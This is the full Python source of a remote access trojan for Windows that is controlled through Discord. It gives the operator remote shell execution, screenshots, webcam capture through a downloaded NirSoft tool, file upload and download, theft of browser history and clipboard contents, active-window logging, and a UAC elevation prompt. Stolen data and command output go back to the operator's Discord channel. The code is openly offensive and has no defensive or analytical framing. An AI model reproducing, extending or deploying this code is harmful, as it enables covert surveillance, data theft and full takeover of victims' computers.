import os
import discord
from ctypes import windll, sizeof, c_uint, byref, c_int, Structure
import asyncio
import sys
from subprocess import list2cmdline

token = ""
global appdata
appdata = os.getenv("APPDATA")

intents = discord.Intents.all()
intents.members = True
intents.message_content = True
client = discord.Client(intents=intents)

helpmenu = """
Available commands are:
• !shell - Execute a shell command (Syntax: "!shell whoami")
• !kill - Kill a session or all sessions (Syntax: "!kill [session_name]/all")
• !exit - Exit the bot
• !windowstart - Start window logging for the session
• !windowstop - Stop window logging for the session
• !ss - Capture and send a screenshot
• !pic - Capture and send a webcam picture
• !upload - Upload a file to the session (Syntax: "!upload [filename]")
• !shell - Execute a shell command (Syntax: "!shell [command]")
• !download - Download a file from the session (Syntax: "!download [filename]")
• !cd - Change the current working directory (Syntax: "!cd [directory]")
• !ls - List files in the current directory
• !help - Display this help menu
• !history - Retrieve browser history
• !clipboard - Retrieve clipboard content
• !sysinfo - Display system information
• !admincheck - Check if you're an admin
• !getadmin - request for admin access
• !idletime - Check user idle time
• !botservers - Check the number of servers the bot is in
"""

def runAsAdmin(cmdLine=None, wait=True):
    if os.name != 'nt':
        raise RuntimeError("This function is only implemented on Windows.")

    import win32con
    import win32event
    import win32process
    # noinspection PyUnresolvedReferences
    from win32com.shell.shell import ShellExecuteEx
    # noinspection PyUnresolvedReferences
    from win32com.shell import shellcon

    if not cmdLine:
        cmdLine = [sys.executable] + sys.argv
    elif type(cmdLine) not in (tuple, list):
        raise ValueError("cmdLine is not a sequence.")

    showCmd = win32con.SW_SHOWNORMAL
    lpVerb = 'runas'  # causes UAC elevation prompt.

    cmd = cmdLine[0]
    params = list2cmdline(cmdLine[1:])

    procInfo = ShellExecuteEx(
        nShow=0,
        fMask=shellcon.SEE_MASK_NOCLOSEPROCESS,
        lpVerb=lpVerb,
        lpFile=cmd,
        lpParameters=params)

    if wait:
        procHandle = procInfo['hProcess']
        _ = win32event.WaitForSingleObject(procHandle, win32event.INFINITE)
        rc = win32process.GetExitCodeProcess(procHandle)
    else:
        rc = None

    return rc

async def downloadZipAndRunExe(message,url,commands=[''],sendFiles=[''],removeFiles=['']):
        import os
        import urllib.request
        from zipfile import ZipFile

        directory = os.getcwd()
        try:
            os.chdir(os.getenv("TEMP"))
            urllib.request.urlretrieve(url, "temp.zip")
            with ZipFile("temp.zip") as zipObj:
                zipObj.extractall()
            for command in commands:
                os.system(f"{command}")
            for f in sendFiles:
                disFile = discord.File(f, filename="temp.png")
                await message.channel.send( file=disFile)
            for f in removeFiles:
                os.remove(f"{f}")
            os.chdir(directory)
        except:
            await message.channel.send("[!] Command failed")


async def activity(client):
    import time
    import win32gui

    while True:
        global stop_threads
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        game = discord.Game(f"Visiting: {window}")
        await client.change_presence(status=discord.Status.online, activity=game)
        time.sleep(1)


def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()


@client.event
async def on_ready():
    import platform
    import re
    import os

    on_ready.total = []
    global number
    number = 0
    global channel_name
    channel_name = f'session-{os.getlogin()}-{platform.system()}-{platform.release()}'.lower()
    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
        # if "session" in on_ready.total[y]:
        #     import re

        #     result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != ""]
        #     biggest = max(map(int, result))
        #     number = biggest + 1
        # else:
        #     pass
    if channel_name not in on_ready.total:
        new_channel = await client.guilds[0].create_text_channel(channel_name)
        print(new_channel)
        channel_ = discord.utils.get(client.get_all_channels(), name=new_channel.name)
        print(channel_)
    else:
        channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    
    channel = client.get_channel(channel_.id)
    is_admin = windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} | | User : {os.getlogin()}"
    if is_admin == True:
        await channel.send(f"{value1} | :gem:")
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)


@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        print(channel_name)
        pass
    else:
        if message.content.startswith("!kill"):
            if message.content[6:] == "all":
                for y in range(len(on_ready.total)):
                    if "session" in on_ready.total[y]:
                        channel_to_delete = discord.utils.get(
                            client.get_all_channels(), name=on_ready.total[y]
                        )
                        await channel_to_delete.delete()
                    else:
                        pass
            else:
                try:
                    channel_to_delete = discord.utils.get(
                        client.get_all_channels(), name=message.content[6:]
                    )
                    await channel_to_delete.delete()
                    await message.channel.send(f"[*] {message.content[6:]} killed.")
                except:
                    await message.channel.send(
                        f"[!] {message.content[6:]} is invalid,please enter a valid session name"
                    )

        if message.content == "!exit":
            exit()

        if message.content == "!windowstart":
            import threading

            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.start()
            await message.channel.send("[*] Window logging for this session started")

        if message.content == "!windowstop":
            stop_threads = True
            await message.channel.send("[*] Window logging for this session stopped")
            game = discord.Game(f"Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)

        if message.content == "!ss":
            import os
            from mss import mss

            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv("TEMP") + "\\monitor.png"))
            file = discord.File(
                os.path.join(os.getenv("TEMP") + "\\monitor.png"),
                filename="monitor.png",
            )
            await message.channel.send("[*] Command successfully executed", file=file)
            os.remove(os.path.join(os.getenv("TEMP") + "\\monitor.png"))

        if message.content == "!pic":
            import os
            import urllib.request
            from zipfile import ZipFile

            directory = os.getcwd()
            try:
                os.chdir(os.getenv("TEMP"))
                urllib.request.urlretrieve(
                    "https://www.nirsoft.net/utils/webcamimagesave.zip", "temp.zip"
                )
                with ZipFile("temp.zip") as zipObj:
                    zipObj.extractall()
                os.system("WebCamImageSave.exe /capture /FileName temp.png")
                file = discord.File("temp.png", filename="temp.png")
                await message.channel.send(
                    "[*] Command successfully executed", file=file
                )
                os.remove("temp.zip")
                os.remove("temp.png")
                os.remove("WebCamImageSave.exe")
                os.remove("readme.txt")
                os.remove("WebCamImageSave.chm")
                os.chdir(directory)
            except:
                await message.channel.send("[!] Command failed")

        if message.content.startswith("!upload"):
            await message.attachments[0].save(message.content[8:])
            await message.channel.send("[*] Command successfully executed")

        if message.content.startswith("!shell"):
            import subprocess
            import os

            instruction = message.content[7:]
            # print(f"Executing command: {instruction}")

            def shell():
                try:
                    output = subprocess.check_output(
                        instruction, shell=True, stderr=subprocess.STDOUT, text=True
                    )
                    return "ok", output
                except subprocess.CalledProcessError as e:
                    return "error", e.output
                except Exception as e:
                    return "error", str(e)

            result, output = shell()

            if result == "ok":
                outFile = os.getenv("TEMP") + "\\output.txt"
                numb = len(output)
                if numb < 1:
                    await message.channel.send(
                        "[*] Command not recognized or no output was obtained"
                    )
                elif numb > 1990:
                    with open(outFile, "w") as f1:
                        f1.write(output)
                    file = discord.File(outFile, filename="output.txt")
                    await message.channel.send(
                        "[*] Command successfully executed", file=file
                    )
                    os.remove(outFile)
                else:
                    await message.channel.send(
                        "[*] Command successfully executed : " + output
                    )
            else:
                await message.channel.send("[*] Error executing command:\n" + output)

        if message.content.startswith("!download"):
            file = discord.File(message.content[10:], filename=message.content[10:])
            await message.channel.send("[*] Command successfully executed", file=file)

        if message.content.startswith("!cd"):
            import os

            os.chdir(message.content[4:])
            await message.channel.send("[*] Command successfully executed")

        if message.content.startswith("!ls"):
            import os

            outFile = os.getenv("TEMP") + "\\output.txt"
            file_list = os.listdir()
            file_list_message = "\n".join(file_list)
            if len(file_list_message) < 1:
                await message.channel.send("[*] ERROR / No File")
            elif len(file_list_message) > 1990:
                with open(outFile, "w") as f1:
                    f1.write(file_list_message)
                file = discord.File(outFile, filename="output.txt")
                await message.channel.send(
                    "[*] Command successfully executed", file=file
                )
                os.remove(outFile)
            else:
                await message.channel.send(
                    "[*] Command successfully executed:\n```"
                    + file_list_message
                    + "```"
                )

        if message.content == "!help":
            await message.channel.send(helpmenu)

        if message.content == "!history":
            import os
            import browserhistory as bh

            dict_obj = bh.get_browserhistory()
            strobj = str(dict_obj).encode(errors="ignore")
            with open("history.txt", "a") as hist:
                hist.write(str(strobj))
            file = discord.File("history.txt", filename="history.txt")
            await message.channel.send("[*] Command successfully executed", file=file)
            os.remove("history.txt")

        if message.content == "!clipboard":
            import ctypes
            import os

            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode()
                user32.CloseClipboard()
                await message.channel.send(f"[*] Clipboard content is : {body}")

        if message.content == "!admincheck":
            import ctypes

            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin:
                await message.channel.send("[*] Congrats you're admin")
            else:
                await message.channel.send("[!] Sorry, you're not admin")
        
        if message.content == "!getadmin":
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin() != 0:
                try:
                    await message.channel.send("[!] Sending Prompt to run as admin")
                    runAsAdmin()
                    exit()
                except Exception as e:
                    await message.channel.send(f'Failed to run as admin: {e}')
            else:
                await message.channel.send("[!] You are already admin")

        if message.content == "!idletime":

            class LASTINPUTINFO(Structure):
                _fields_ = [
                    ("cbSize", c_uint),
                    ("dwTime", c_int),
                ]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0

            import threading

            global idle1
            idle1 = threading.Thread(target=get_idle_duration)
            idle1._running = True
            idle1.daemon = True
            idle1.start()
            duration = get_idle_duration()
            await message.channel.send("User idle for %.2f seconds." % duration)
            import time

            time.sleep(1)

        if message.content.startswith("!botservers"):
            await message.channel.send(
                "I'm in " + str(len(client.guilds)) + " servers!"
            )


client.run(token)
